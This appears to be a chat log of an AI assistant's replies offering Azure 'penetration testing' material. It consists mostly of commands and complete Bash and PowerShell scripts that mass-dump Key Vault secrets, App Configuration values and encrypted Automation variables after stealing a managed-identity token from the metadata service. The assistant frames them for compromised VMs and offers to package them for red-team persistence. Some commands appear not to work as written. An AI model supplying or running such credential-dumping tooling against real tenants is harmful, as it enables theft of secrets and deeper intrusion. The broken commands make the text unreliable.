# Secrets and Credential Retrieval Techniques

Here is a corrected, summarized, and rewritten version of the content,
adapted for **Azure penetration testing** (instead of AWS), focusing on
enumeration and retrieval of secrets, parameters, and credentials using
similar techniques in the Azure ecosystem:

**🔐 Azure PenTest: Secrets and Credential Retrieval Techniques**

**🧪 1. Enumerate and Retrieve Azure Key Vault Secrets**

**Mass Secret Dumping from Multiple Key Vaults**

az keyvault list --query "\[\].name" -o tsv \| \\

xargs -I {} az keyvault secret list --vault-name {} --query "\[\].id" -o
tsv \| \\

xargs -I {} az keyvault secret show --id {} --query "value" -o tsv

- az keyvault list: Lists all Key Vaults in the current subscription.

- az keyvault secret list: Lists secrets stored in each vault.

- az keyvault secret show: Retrieves the actual secret value from the
  secret ID.

**Syntax-highlighted Output (Optional)**

az keyvault secret show --vault-name \<vault_name\> --name
\<secret_name\> -o json \| ccat

Replace ccat with your preferred syntax-highlighting tool (e.g., bat or
jq).

**🛡️ 2. Enumerate and Retrieve Azure App Configuration Key-Values**

az appconfig list --query "\[\].name" -o tsv \| \\

xargs -I {} az appconfig kv list --name {} --query "\[\].{Key:key,
Value:value}" -o tsv

- az appconfig list: Lists all App Configuration instances.

- az appconfig kv list: Retrieves key-value pairs from each
  configuration store.

**🔧 3. Retrieve and Decrypt Azure Automation Variables (if RBAC
allows)**

az automation variable list --automation-account-name \<account\>
--resource-group \<rg\> -o json \| \\

jq -r '.\[\] \| select(.encrypted == true) \| .name' \| \\

xargs -I {} az automation variable show --name {}
--automation-account-name \<account\> --resource-group \<rg\> --query
"value" -o tsv

- Targets encrypted variables that may contain credentials or secrets.

**4. Exploit Azure Instance Metadata Service (IMDS)**

**Step 1: Query for Managed Identity**

curl -H Metadata:true
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01"

- Retrieves an access token for the VM's assigned managed identity.

- Use the token to authenticate with Azure CLI or REST APIs.

**Step 2: Use Access Token to Enumerate Secrets**

export AZURE_TOKEN=\<access_token\>

az account get-access-token --access-token \$AZURE_TOKEN

az keyvault secret list --vault-name \<vault\> --query "\[\].id" -o tsv
\| \\

xargs -I {} az keyvault secret show --id {} --query "value" -o tsv

**🧬 5. Use AzureHound/BloodHound for Role Enumeration**

AzureHound can be used to enumerate principals, roles, Key Vault access
policies, and privilege escalation paths:

./AzureHound.exe -c All --token \<token\> --tenant \<tenant_id\>

You can extract relevant object IDs and automate retrieval of Key Vault
secrets using the Azure CLI or SDKs.

**🛠 Optional Tools and Helpers**

- **CloudFuzzer Equivalent**: No direct Azure equivalent for tools like
  cf s3ls or s3bucketbrute. However, Azure storage account name
  bruteforcing can be scripted via DNS or az storage account check-name.

- **IMDS-Helper Equivalent**: IMDS access can be scripted with curl and
  custom tokens. Some tools like AZScanner, CloudSploit, and ScoutSuite
  can wrap around these.

**🔐 Summary: Key Azure Services to Target for Secrets**

| **Azure Service** | **Tool/Command** | **Notes** |
|----|----|----|
| Key Vault | az keyvault secret show | Primary location for secrets |
| App Configuration | az appconfig kv list | Often used for app secrets |
| Automation Variables | az automation variable show | May store service credentials |
| Instance Metadata Service | curl to 169.254.169.254 | Fetch managed identity tokens |
| AzureHound + BloodHound | AzureHound.exe -c All | AD and RBAC enumeration |

Would you like a script to automate this entire secrets enumeration
workflow for Azure VMs and Key Vaults?

Great — here's a full **Azure secrets enumeration script** designed for
use during a **post-exploitation or assessment phase** after gaining
valid credentials or a token (e.g., via VM Managed Identity exploitation
or Azure CLI access):

**🔧 Azure Secrets Enumeration Script (Bash)**

\#!/bin/bash

\# Requirements:

\# - Azure CLI logged in (or \`AZURE_TOKEN\` exported)

\# - jq installed

\# Optional: use token if obtained from IMDS or elsewhere

if \[\[ ! -z "\$AZURE_TOKEN" \]\]; then

echo "\[\*\] Using access token from environment variable"

az account get-access-token --access-token "\$AZURE_TOKEN" \>/dev/null

fi

\# Function: Dump Key Vault Secrets

dump_keyvault_secrets() {

echo "\[+\] Enumerating Key Vaults..."

for vault in \$(az keyvault list --query "\[\].name" -o tsv); do

echo " - Vault: \$vault"

secrets=\$(az keyvault secret list --vault-name "\$vault" --query
"\[\].name" -o tsv)

for secret in \$secrets; do

value=\$(az keyvault secret show --vault-name "\$vault" --name
"\$secret" --query "value" -o tsv 2\>/dev/null)

echo " \[Secret\] \$secret =\> \$value"

done

done

}

\# Function: Dump App Config Key-Values

dump_appconfig() {

echo "\[+\] Enumerating App Configurations..."

for config in \$(az appconfig list --query "\[\].name" -o tsv); do

echo " - AppConfig: \$config"

az appconfig kv list --name "\$config" --query "\[\].{Key:key,
Value:value}" -o tsv 2\>/dev/null

done

}

\# Function: Dump Automation Variables (requires permission)

dump_automation_variables() {

echo "\[+\] Enumerating Automation Accounts for variables..."

for rg in \$(az group list --query "\[\].name" -o tsv); do

for account in \$(az automation account list --resource-group "\$rg"
--query "\[\].name" -o tsv 2\>/dev/null); do

echo " - Automation Account: \$account (Resource Group: \$rg)"

vars=\$(az automation variable list --automation-account-name
"\$account" --resource-group "\$rg" --query
"\[?encrypted==\\true\\\].name" -o tsv 2\>/dev/null)

for var in \$vars; do

value=\$(az automation variable show --name "\$var"
--automation-account-name "\$account" --resource-group "\$rg" --query
"value" -o tsv 2\>/dev/null)

echo " \[Variable\] \$var =\> \$value"

done

done

done

}

\# Function: Use IMDS (if running on Azure VM)

use_imds() {

echo "\[+\] Attempting IMDS Token Retrieval..."

token=\$(curl -s -H Metadata:true
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01"
\| jq -r '.access_token')

if \[\[ "\$token" != "null" && ! -z "\$token" \]\]; then

export AZURE_TOKEN=\$token

echo " \[\*\] IMDS Token retrieved successfully"

else

echo " \[!\] Failed to retrieve token from IMDS"

fi

}

\# === Execution Flow ===

use_imds

dump_keyvault_secrets

dump_appconfig

dump_automation_variables

**🧪 Notes**

- Works on Linux/macOS or WSL.

- Can be run on a compromised VM or from attacker infrastructure (if
  credentials/token is set).

- You can optionally wrap this into a PowerShell script for Windows VMs.

Would you like a **PowerShell version** or want this converted into an
**Azure Function for red team automation**?

Here is a **PowerShell version** of the Azure secrets enumeration script
— ideal for **Windows-based VMs**, red team operations, or blue team
audit automation:

**🔧 PowerShell Script: Azure Secrets Enumeration**

\# Prerequisites:

\# - Logged into Azure CLI or use token from IMDS

\# - Azure CLI and Az PowerShell modules installed

function Use-IMDS {

Write-Host "\[+\] Attempting to retrieve token from IMDS..."

try {

\$headers = @{ Metadata = "true" }

\$response = Invoke-RestMethod -Headers \$headers -Uri
"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01"

if (\$response.access_token) {

\$env:AZURE_ACCESS_TOKEN = \$response.access_token

Write-Host "\[\*\] IMDS Token retrieved successfully."

az account get-access-token --access-token \$env:AZURE_ACCESS_TOKEN \|
Out-Null

}

} catch {

Write-Host "\[!\] Failed to retrieve token from IMDS"

}

}

function Dump-KeyVault-Secrets {

Write-Host "\`n\[+\] Enumerating Azure Key Vaults..."

\$vaults = az keyvault list --query "\[\].name" -o tsv

foreach (\$vault in \$vaults) {

Write-Host " - Vault: \$vault"

\$secrets = az keyvault secret list --vault-name \$vault --query
"\[\].name" -o tsv

foreach (\$secret in \$secrets) {

\$value = az keyvault secret show --vault-name \$vault --name \$secret
--query "value" -o tsv 2\>\$null

Write-Host " \[Secret\] \$secret =\> \$value"

}

}

}

function Dump-AppConfigs {

Write-Host "\`n\[+\] Enumerating App Configuration Stores..."

\$configs = az appconfig list --query "\[\].name" -o tsv

foreach (\$config in \$configs) {

Write-Host " - AppConfig: \$config"

az appconfig kv list --name \$config --query "\[\].{Key:key,
Value:value}" -o tsv 2\>\$null

}

}

function Dump-Automation-Variables {

Write-Host "\`n\[+\] Enumerating Automation Account Variables..."

\$resourceGroups = az group list --query "\[\].name" -o tsv

foreach (\$rg in \$resourceGroups) {

\$accounts = az automation account list --resource-group \$rg --query
"\[\].name" -o tsv 2\>\$null

foreach (\$account in \$accounts) {

Write-Host " - Automation Account: \$account (RG: \$rg)"

\$vars = az automation variable list --automation-account-name \$account
--resource-group \$rg --query "\[?encrypted==\\true\\\].name" -o tsv
2\>\$null

foreach (\$var in \$vars) {

\$value = az automation variable show --name \$var
--automation-account-name \$account --resource-group \$rg --query
"value" -o tsv 2\>\$null

Write-Host " \[Variable\] \$var =\> \$value"

}

}

}

}

\# === Execution Flow ===

Use-IMDS

Dump-KeyVault-Secrets

Dump-AppConfigs

Dump-Automation-Variables

**🧰 Features**

- Automatically retrieves a token from **IMDS** (ideal for compromised
  Azure VMs).

- Dumps:

  - Key Vault secrets

  - App Configuration key-values

  - Encrypted Automation Account variables

- Works on **PowerShell 5.x** or **7+** with Azure CLI.

Would you like this packaged as an **Azure Function** (e.g., for red
team persistence or internal automation)?
